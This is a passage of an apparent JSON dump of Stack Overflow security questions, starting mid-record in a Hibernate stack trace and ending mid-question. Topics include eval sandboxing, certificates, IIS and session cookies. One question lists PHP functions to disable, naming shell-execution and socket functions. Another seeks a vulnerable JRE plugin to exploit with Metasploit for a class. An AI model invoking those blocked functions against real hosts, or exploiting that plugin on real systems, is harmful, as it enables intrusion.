Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\norg.hibernate.exception.GenericJDBCException: Cannot open connection\n    org.hibernate.exception.SQLStateConverter.handledNonSpecificException(SQLStateConverter.java:140)\n    org.hibernate.exception.SQLStateConverter.convert(SQLStateConverter.java:128)\n    org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:66)\n    org.hibernate.exception.JDBCExceptionHelper.convert(JDBCExceptionHelper.java:52)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:449)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\njava.sql.SQLException: Connections could not be acquired from the underlying database!\n    com.mchange.v2.sql.SqlUtils.toSQLException(SqlUtils.java:106)\n    com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:529)\n    com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:128)\n    org.hibernate.connection.C3P0ConnectionProvider.getConnection(C3P0ConnectionProvider.java:78)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:446)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n\nroot cause\n\ncom.mchange.v2.resourcepool.CannotAcquireResourceException: A ResourcePool could not acquire a resource from its primary factory or source.\n    com.mchange.v2.resourcepool.BasicResourcePool.awaitAvailable(BasicResourcePool.java:1319)\n    com.mchange.v2.resourcepool.BasicResourcePool.prelimCheckoutResource(BasicResourcePool.java:557)\n    com.mchange.v2.resourcepool.BasicResourcePool.checkoutResource(BasicResourcePool.java:477)\n    com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool.checkoutPooledConnection(C3P0PooledConnectionPool.java:525)\n    com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource.getConnection(AbstractPoolBackedDataSource.java:128)\n    org.hibernate.connection.C3P0ConnectionProvider.getConnection(C3P0ConnectionProvider.java:78)\n    org.hibernate.jdbc.ConnectionManager.openConnection(ConnectionManager.java:446)\n    org.hibernate.jdbc.ConnectionManager.getConnection(ConnectionManager.java:167)\n    org.hibernate.jdbc.JDBCContext.connection(JDBCContext.java:160)\n    org.hibernate.transaction.JDBCTransaction.begin(JDBCTransaction.java:81)\n    org.hibernate.impl.SessionImpl.beginTransaction(SessionImpl.java:1473)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.hibernate.context.ThreadLocalSessionContext$TransactionProtectionWrapper.invoke(ThreadLocalSessionContext.java:345)\n    $Proxy4.beginTransaction(Unknown Source)\n    ir.omicc.classes.Publisher.getTop5News(Publisher.java:100)\n    org.apache.jsp.index_jsp._jspService(index_jsp.java:229)\n    org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:377)\n    org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)\n    org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)\n    javax.servlet.http.HttpServlet.service(HttpServlet.java:717)\n    sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)\n    sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)\n    java.lang.reflect.Method.invoke(Method.java:597)\n    org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:269)\n    java.security.AccessController.doPrivileged(Native Method)\n    javax.security.auth.Subject.doAsPrivileged(Subject.java:517)\n    org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:301)\n    org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:162)\n</code></pre>\n"},{"tags":["python","security","eval"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":395,"score":3,"question_id":1994071,"title":"How safe is expression evaluation using eval?","body":"<p>I am building a website where I have a need that user should be able to evaluate some expression based from the value in DB tables, instead of using tools like pyparsing etc, I am thinking of using python itself, and have come up with a solution which is sufficient for my purpose. I am basically using eval to evaluate the expression and passing globals dict with empty <code>__builtins__</code> so that nothing can be accessed and a locals dict for values from DB, if user will need some functions I can pass those too e.g.</p>\n\n<pre><code>import datetime\ndef today():\n    return datetime.datetime.now()\n\nexpression = \"\"\" first_name.lower() == \"anurag\" and today().year == 2010 \"\"\"\n\nprint eval(expression, {'__builtins__':{}}, {'first_name':'Anurag', 'today':today})\n</code></pre>\n\n<p>So my question is how safe it would be , I have three criteria</p>\n\n<ol>\n<li>Can user access current state of my program or table etc someshow?</li>\n<li>Can user have access to os level calls?</li>\n<li>Can user halt my system by looping or using much memory e.g. by doing range(10*8), in some cases he can e.g 100**1000 etc so 3 is not so much of a problem. i may check such op with tokenize and anyway I will be using GAE so it is not not much of concern.</li>\n</ol>\n\n<p><strong>Edit</strong>: IMO this is not the duplicate of <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Q:661084</a> because where it ends this one starts, I want to know even with <code>__builtins__</code> blocked, can user do bad things?</p>\n"},{"tags":["python","security"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":712,"score":2,"question_id":28369,"title":"Is \"safe_eval\" really safe?","body":"<p>I'm looking for a \"safe\" eval function, to implement spreadsheet-like calculations (using numpy/scipy).</p>\n\n<p>The functionality to do this (the <a href=\"http://docs.python.org/lib/module-rexec.html\" rel=\"nofollow\">rexec module</a>) has been removed from Python since 2.3 due to apparently unfixable security problems. There are several third-party hacks out there that purport to do this - the most thought-out solution that I have found is \n<a href=\"http://code.activestate.com/recipes/496746/\" rel=\"nofollow\">this Python Cookbok recipe</a>, \"safe_eval\". </p>\n\n<p>Am I reasonably safe if I use this (or something similar), to protect from malicious code, or am I stuck with writing my own parser? Does anyone know of any better alternatives?</p>\n\n<p>EDIT: I just discovered <a href=\"http://pypi.python.org/pypi/RestrictedPython\" rel=\"nofollow\">RestrictedPython</a>, which is part of Zope. Any opinions on this are  welcome.</p>\n"},{"tags":["asp.net","windows","security","iis7"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13205555,"title":"Web application can't be accessed from outside our network","body":"<p>We developed an ASP.Net application that is now residing on a Windows 7 Home Premium computer.</p>\n\n<p>Users who are on the same network can access this application but users from outside of the network can't access it. They just get a message in their browser that the page can't be found.</p>\n\n<p>Can you tell us how to enable the computer so the application is accessible outside of our network so it's an Internet application?</p>\n\n<p>So far we disabled the Windows firewall and made sure the port for the virtual directory that contains the web application is open for incoming and outgoing traffic.</p>\n"},{"tags":["security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13211458,"title":"Symfony2: Security/Routing Issue","body":"<p>Im using FOSFacebookBundle and FOSUserBundle on Symfony 2.1.3. Have some troubles with my security settings:</p>\n\n<pre><code>imports:    \n  - { resource: facebookParameters.ini }\n\nsecurity:\n  providers:\n    my_fos_facebook_provider:\n        id: my.facebook.user            \n  firewalls:\n    main:\n        pattern: ^/\n        fos_facebook:\n            app_url: %facebookAppUrl%\n            server_url: %facebookServerUrl%\n            login_path: /login\n            check_path: /login_fb_check\n            default_target_path: /\n            provider: my_fos_facebook_provider\n        logout:\n            handlers: [\"fos_facebook.logout_handler\"]\n        anonymous:    true\n  access_control:\n    - { path: ^/game, roles: ROLE_FACEBOOK }\n    - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n    - { path: ^/gameinfos, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n</code></pre>\n\n<p>Path game should be secured by facebook login, path login and gameinfos should be free to all visitors. Ok login is fine, its accessable from everywhere, but gameinfos is not. It allways directs me to facebook when i call the path / route.\nWhere could be the problem?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13209383,"title":"Block php functions which are not suppose to use publicly","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3115559/exploitable-php-functions\">Exploitable PHP functions</a>  </p>\n</blockquote>\n\n\n\n<p>My question is about <strong>disable_functions</strong>. May I ask for a list of functions that are vulnerable for online users when they are using online PHP editor. Like <a href=\"http://writecodeonline.com/php/\" rel=\"nofollow\">http://writecodeonline.com/php/</a> this editor blocks many functions. I have found few of them that are</p>\n\n<blockquote>\n  <p>disable_functions = “apache_child_terminate, apache_setenv, define_syslog_variables, escapeshellarg, escapeshellcmd, eval, exec, dl, fsocket, pfsockopen, fsockopen, fp, fput, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, highlight_file, ini_alter, ini_get_all, ini_restore, inject_code, mysql_pconnect, openlog, phpinfo, passthru, php_uname, phpAds_remoteInfo, phpAds_XmlRpc, phpAds_xmlrpcDecode, phpAds_xmlrpcEncode, popen, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_setuid, posix_uname, proc_close, proc_get_status, proc_nice, proc_open, proc_terminate, shell_exec, syslog, system, system,proc_open, symlink, xmlrpc_entity_decode, popen, curl_exec, curl_multi_exec, parse_ini_file, show_source” </p>\n</blockquote>\n\n<p>Thanks to <a href=\"http://www.jonboy60.com/2010/05/04/disable_function-on-php-ini/\" rel=\"nofollow\">http://www.jonboy60.com/2010/05/04/disable_function-on-php-ini/</a></p>\n"},{"tags":["security","hash","cryptography","unique"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13203363,"title":"Possibility of Two Hashes with same collision","body":"<p>Is there a way to prove/create (or are there known hash functions) 2 hash functions that never have the same collision?   I mean, like provable in way that someone who took 1 cryptography class in university can prove.  </p>\n\n<p>For example, I want hash functions A and B such that if hash function A collides on X and Y, then B will not collide on X and Y.</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13208199,"title":"Prevent people from accessing your classes and include files directly","body":"<p>I'm making my own MVC framework and I remember seeing something like this in phpBB forums index page code:</p>\n\n<pre><code>define('IN_PHPBB', true);\n</code></pre>\n\n<p>and then in the files that are only ment to be included and not directly accessed it has this at the top:</p>\n\n<pre><code>if(!defined('IN_PHPBB')) {\n    die();\n}\n</code></pre>\n\n<p>I was wondering if that is neccessary especially with class files because if they are directly accessed they won't run anyway since they were not instantiated.</p>\n"},{"tags":["c#",".net","security","certificate","x509certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":13206654,"title":"Certificates - More than 1 serial number?","body":"<p>weird : </p>\n\n<p>I use this code to find certificate via c# by this code : </p>\n\n<pre><code> X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);\n store.Open(OpenFlags.ReadOnly | OpenFlags.OpenExistingOnly);\n var certificates = store.Certificates;\n X509Certificate2Collection certificateCollection = store.Certificates.Find(X509FindType.FindBySerialNumber, \"the Serial Number\", false);\n</code></pre>\n\n<p>So I tested to see by an existing certificate : </p>\n\n<p><img src=\"http://i.stack.imgur.com/b2upF.jpg\" alt=\"enter image description here\"></p>\n\n<p>but it didn't worked (as mentioned in the linked question). ( Also tried  , remove spaces , capital etc... - non worked).</p>\n\n<p>But when I played with it a bit I found <strong>another serial location</strong> : </p>\n\n<p><img src=\"http://i.stack.imgur.com/WS4TB.jpg\" alt=\"enter image description here\"></p>\n\n<p>this time just pasted the exact phrase  <code>\"4e a1 ae 96 ec 1a b6 82 4e f6 23 9a 16 04 1a 51\"</code> and it <strong>worked</strong> .</p>\n\n<p>What is going on here ? </p>\n\n<p>why there are 2 different serial numbers and what are the differences between them  ? </p>\n\n<p><em>p.s. , However , not all certificates has the \"Authority Key Identifier \" , so there's still a problem finding by other properties...</em></p>\n"},{"tags":["security","excel","vba","password-protection"],"answer_count":5,"favorite_count":4,"up_vote_count":8,"down_vote_count":0,"view_count":41830,"score":8,"question_id":272503,"title":"How do I remove the password from a VBA project?","body":"<p>How can I programmatically remove a (known) password from an Excel VBA project?</p>\n\n<p>To be clear: I want to remove the password from the VBA Project, not the workbook or any worksheets.</p>\n"},{"tags":["ruby-on-rails","security","recaptcha","spam"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13186472,"title":"Security issue: bypassing reCaptcha in Rails 3.1","body":"<p>I don't understand how they succeed to post so much spam even though I have recaptcha working (if verify_recaptcha...) Here's what I have in controller:</p>\n\n<pre><code>def create\n    @comment = Comment.new(params[:comment])\n\n    respond_to do |format|\n      if verify_recaptcha(:model =&gt; @post, :message =&gt; \"Oh! There's a problem with reCAPTCHA's input!\")\n        if @comment.save\n          #flash[:submit_notice] = 'Comment was successfully created.'\n          Notifications.comment_notification(@comment).deliver\n          format.html { redirect_to(:back) }\n        else\n          format.html { redirect_to(@comment) }\n        end\n      end\n    end\n  end\n</code></pre>\n\n<p>And here's what I see in production.log:</p>\n\n<pre><code>Started POST \"/en/comments\" for 199.15.234.180 at 2012-11-01 19:50:48 +0200\nProcessing by CommentsController#create as */*\n  Parameters: {\"utf8\"=&gt;\"&amp;#x2713;\", \"authenticity_token\"=&gt;\"yFrJyx7EPCG9d29+PEbkNOHlUpuyXIVSy5acGNOO0mU=\", \"comment\"=&gt;{\"pos.....\n</code></pre>\n\n<p>Spam HTML follows. To my understanding, \"as */*\" is not HTML, which is a \"normal\" POST request. So I'm guessing the problem is somewhere there. Tried to google for */* didn't find anything. So what the heck is that?</p>\n\n<p><strong>UPDATE: [SOLVED]</strong></p>\n\n<p>It looks like not an issue, just someone who's bored persistently posts SPAM comments and solves reCaptchas (or maybe machine learning has advanced so far?). Probably Mollom is the next thing to add there :)</p>\n"},{"tags":["java","security","ssl","bouncycastle","digital-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13207378,"title":"Saving certificate chain in a pkcs12 keystore","body":"<p>The following code: </p>\n\n<pre><code>//used Bouncy Castle provider for keyStore\nkeyStore.setKeyEntry(alias, (Key)keyPair.getPrivate(), pwd, certChain);  \n</code></pre>\n\n<p>where certChain holds the end certificate and the issuer certificate (i.e. two certificates),<br>\ndoesn't save the issuer certificate as part of the chain in the saved to the file system keystore file if the keyStore is an instance of <code>PKCS12</code>.  </p>\n\n<p>It does save both certificates if the keystore type is <code>PKCS12-3DES-3DES</code>.\nWhy is this? Doesn't a PKCS12 suppose to have both certificates are part of the chain?</p>\n"},{"tags":["asp.net","security","iis","iis6"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13202184,"title":"Preventing asp.net pages from executing in a sub-folder","body":"<p>I have a dotnet site which contains a virtual directory (/ArticleImages) which maps to a file share on another server.  The file share is accessible to a large number of people so, as a security measure, I do not want any asp.net pages to execute in this folder (e.g. putting default.aspx in the file share and browsing to site.com/ArticleImages/default.aspx should either not serve or, preferably, serve as a simple download rather than executing).</p>\n\n<p>I'm using IIS 6.0 and added the virtual directory.  If I remove the application from this folder, it uses the parent application and complains that it can't read web.config.  If I add an application to this folder, even if I remove all application extensions, it complains that svc-xyzzy (the account used to access the share) doesn't have access to 'C:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\Temporary ASP.NET Files'.</p>\n\n<p>How do I have a sub folder of an application which does not execute dotnet code?</p>\n"},{"tags":["security","cakephp","cakephp-1.3"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12382266,"title":"CakePHP 1.3 black hole when posting associated model form","body":"<p>I came across this problem, where my hidden fields causes a black hole, when an Associated model Form is Posted.\nThe \"is locked\" array, points out on to the hidden Contact Model fields (ei city and id), causing a mismatch in the Token.\nThis in general, is my Form:</p>\n\n<pre><code>&lt;?php echo $this-&gt;Form-&gt;create('Member');?&gt;\n    &lt;fieldset&gt;\n    &lt;?php\n        echo $this-&gt;Form-&gt;input($field_prefix.'family_id',array('type'=&gt;'hidden'));\n        echo $this-&gt;Form-&gt;input($field_prefix.'contact_id',array('type'=&gt;'hidden'));\n        echo $this-&gt;Form-&gt;input($field_prefix.'term_id',array('type'=&gt;'hidden','value'=&gt;$memberrole));\n\n//Associated Model\necho $this-&gt;Form-&gt;input('Contact.0.city',array('type'=&gt;'hidden'));\n\n        echo $this-&gt;Form-&gt;input('Contact.0.postcode');\n        echo $this-&gt;Form-&gt;input('Contact.0.phone');\n        echo $this-&gt;Form-&gt;input('Contact.0.cellphone');\n        echo $this-&gt;Form-&gt;input('Contact.0.email',array('value'=&gt;\"\"));\n        echo $this-&gt;Form-&gt;input('Contact.0.id',array('type'=&gt;'hidden'));        \n    ?&gt;\n    &lt;/fieldset&gt;\n&lt;?php echo $this-&gt;Form-&gt;end(__('Submit', true));?&gt;\n</code></pre>\n\n<p>Any Ideas? I really don't want to disable security.</p>\n"},{"tags":["windows","security","iis","iis7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13187709,"title":"Block access to any directory of a certain name","body":"<p>Is it possible in IIS to block access to any directory in the public web folder, that has a certain name. For example <code>private_cms</code>?</p>\n\n<p>If possible, is there any performance penalty to this? Would it be better to store the files outside of the www folder?</p>\n"},{"tags":["php","security","redirect","data-structures","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":13203839,"title":"unwanted URL switch and security concern. looking for a simpler or better solution","body":"<p>I couldn't do it any shorter :-/</p>\n\n<p>I'm having a problem with my php project concerning redirects and $_GET.</p>\n\n<p>I hope you will help me :)</p>\n\n<p>Lets say I have these 3 folders in the root of my Webserver.</p>\n\n<pre><code>/root\n   /themes\n         /page.php\n   /project1\n         /index.php\n         /content.php\n   /project2\n         /index.php\n         /content.php\n</code></pre>\n\n<p><code>/themes</code> contains a php file called <code>/page.php</code><br />\n<code>/page.php</code> contains a dynamic PHP/HTML structure or theme, which I can use for different content files.<br /></p>\n\n<p><code>/project1</code> and <code>/project2</code> contain mostly HTML content files which get included by <code>/page.php</code>.<br /></p>\n\n<p><code>/project1</code> and <code>/project2</code> are the root folders for 2 different domains, so each contains an <code>index.php</code>.</p>\n\n<p><b>Now the problem:</b><br />\nIn order to get the websites for each domain to work I have to redirect the user to <code>/themes/page.php</code>, because thats where the functionality is and then include the correct content files.<br />\nTo let <code>/page.php</code> know what content file out of <code>/project1</code> or <code>/project2</code> it has to load I use a redirect for <code>index.php</code> to fill <code>$_GET</code> ,like this :</p>\n\n<pre><code>header(\"Location: root-domain/themes/page.php?path=project1&amp;file=content1\");\n</code></pre>\n\n<p>That way page.php gets to know the path and filename of the requested file, by taking it from GET.</p>\n\n<p><b>BUT:</b><br />\nThat way the user gets to know each folder and each filename, even of some php files. I don't know if that's good?<br />\nAnd the URL changes from the requested URL into the URL of my webserver root.</p>\n\n<p>Does one know a better solution?</p>\n\n<p>Thanks! &lt;3</p>\n"},{"tags":["security","amazon-rds","data-security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13053526,"title":"Amazon RDS Security - Is there any alternative to Encryption at Rest?","body":"<p>When using a Cloud DB Provider like the Amazon RDS service, the service is responsible for various things like patching / updates / backup etc, does that mean that Amazon employees have access to the data within the DB itself? </p>\n\n<p>If so, is there any way of ensuring that the provider's employees do not have access - to potentially misuse the data?</p>\n\n<p>One way that I am aware of is by using Encryption at rest i.e. have my application encrypt sensitive data before saving to the DB and decrypt it on retrieval. However, this is not only an overhead in terms of performance but also requires changes to my application itself.</p>\n\n<p>I am guessing that most customers who contemplate using a cloud DB service would probably have this as their first concern but I am somehow unable to get any specific answer around this either from the Amazon help / RDS security notes. </p>\n\n<p><em>Note : While I understand that this is not really a programming question but i do feel that its not generic enough for programmers so I am posting it here.</em> </p>\n"},{"tags":["security","android-ndk","adb"],"answer_count":2,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":192,"score":12,"question_id":12523992,"title":"Run native ARM executable on Jelly Bean","body":"<p>I am looking for methods to run native ARM executable on Android 4.1 (Jelly Bean). For example, compiling the classical C program</p>\n\n<pre><code>// hello.c\n#include &lt;stdio.h&gt;\nint main() {\n    printf(\"Hello world\");\n}\n</code></pre>\n\n<p>to ARMv7a executable, say <code>hello</code> using the Android NDK and then run it in Android shell. I have tried method suggested on the web such as pushing the executable to <code>/data/local</code> by</p>\n\n<pre><code>adb push hello /data/local\n</code></pre>\n\n<p>change permission to allow it to be executed by</p>\n\n<pre><code>adb shell chmod 755 /data/local/hello\n</code></pre>\n\n<p>and then invoke them in the shell using</p>\n\n<pre><code>adb shell /data/local/hello\n</code></pre>\n\n<p>The last step fails with error:</p>\n\n<pre><code>/data/local/hello: not found\n</code></pre>\n\n<p>but evidently the file is there. I suspect the problem is that Jelly Bean's shell does not allow one to execute <em>alien</em> binaries anymore. Can anyone confirm this and give me a solution?</p>\n"},{"tags":["asp.net-mvc","security","query-string","guid"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13201844,"title":"table ids in querystrings","body":"<p>We have an MVC 3 application that uses nHibernate. There are various controller actions that expose the ids of objects contained in the database, e.g. /edit/1. These are just sequential numeric ids of the records in the database.</p>\n\n<p>Would it be better security wise to use GUID's instead, to prevent URL tampering?</p>\n"},{"tags":["security","session","login"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":38,"score":3,"question_id":13146298,"title":"Why should I use session id in cookie instead of storing login and (hashed) password in cookie?","body":"<p>(I was surprised that this question wasn't asked on Stack for now, but I've done some searching and couldn't find anything o.O)</p>\n\n<p>I am working on service-based webapp and I wonder what is the best way for handling user logins. So far I have:</p>\n\n<ol>\n<li>When user login in, they supply creditials. Password is salted and hashed locally, than it's transmit to server over POST (so sniffing users won't be able to retrieve original password ie. to check them on the other sites)</li>\n<li>Login and hashed password are stored in cookie with TTL of 15 minutes (revoked every single webaction)</li>\n<li>Passwod is server-side salted and hashed again, and than it's compared with password stored in database (so, passwords are double hashed with different salts, this is for someone who'll break into database - they still won't be able to recover login creditionals)</li>\n<li>User can do at most 3 login attempts per 5 minutes from single IP</li>\n<li>Users get information about last successful and unsuccessful login attempts alongside with date and IP</li>\n</ol>\n\n<p>Someone had noted that it's better to store unique session id instead of hashed password in cookie and I wonder why it is so important - if someone sniff packets, than it's no matter session id or not - they still can get packet from login with all data needed to pose as legitimate users and login themselves. So are there any other advantages of stored session-id approach over storing login and hashed-password in cookie appraoach?</p>\n"},{"tags":["security","plugins","jre","exploit","metasploit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13192432,"title":"Where can I download JRE 7u5 plugin for any browser?","body":"<p>I was looking for a good exploit to use as my final project for security class so I though for JRE 7u5 bug to exploit using Metasploit.</p>\n\n<p>Where I can download that version of plugin for FireFox/IE/Chrome, for whatever browser?</p>\n\n<p>I Googled for hours now and I can't find a link =?</p>\n"},{"tags":["objective-c","ios","security","hash","sha256"],"answer_count":2,"favorite_count":12,"up_vote_count":13,"down_vote_count":0,"view_count":4035,"score":13,"question_id":6228092,"title":"How can I compute a SHA-2 (ideally SHA 256 or SHA 512) hash in iOS?","body":"<p>The Security services API doesn't appear to allow me to compute a hash directly. There are plenty of public domain and liberally licensed versions available, but I'd rather use a system library implementation if possible.</p>\n\n<p>The data is accessible via NSData, or plain pointers.</p>\n\n<p>The cryptographic strength of the hash is important to me. SHA-256 is the minimum acceptable hash size.</p>\n"},{"tags":["php","security","sanitize"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13197651,"title":"Sanitizing global arrays in PHP","body":"<p>I'm trying to find the best way to sanitize requests in PHP. </p>\n\n<p>From what I've read I learned that GET variables should be sanitized only when they're being displayed, not at the beginning of the \"request flow\". Post variables (which don't come from the database) either.</p>\n\n<p>I can see several problems here:</p>\n\n<p>Of course I can create functions sanitizing these variables, and by calling something like <code>Class::post('name')</code>, or <code>Class::get('name')</code> everything will be safe. But what if a person who will use my code in the future will forget about it and use casual <code>$_POST['name'</code>] instead of my function? Can I provide, or should I provide a bit of security here?</p>\n"},{"tags":["security","google-chrome","ssl","selenium","phpunit"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13198004,"title":"PHPUnit/Selenium - How to stop Google Chrome from showing a SSL security error","body":"<p>I'm running my selenium tests on a server that doesn't have a valid security certificate.  So when I run the tests I have to click \"Proceed Anyway\" on the certificate error screen in order for my tests to start.  I'm trying to automate my tests, but can't because I have to manually click \"Proceed Anyway\" for each one of my tests.</p>\n\n<p>Is there any way to disable the SSL error when starting Chrome for my automated tests?</p>\n\n<p>Thanks,</p>\n\n<p>John</p>\n"},{"tags":["security","grails","ip","cloud"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13142733,"title":"Grails get Client IP whne deploying to Cloud?","body":"<p>I have a Grails App and I am looking 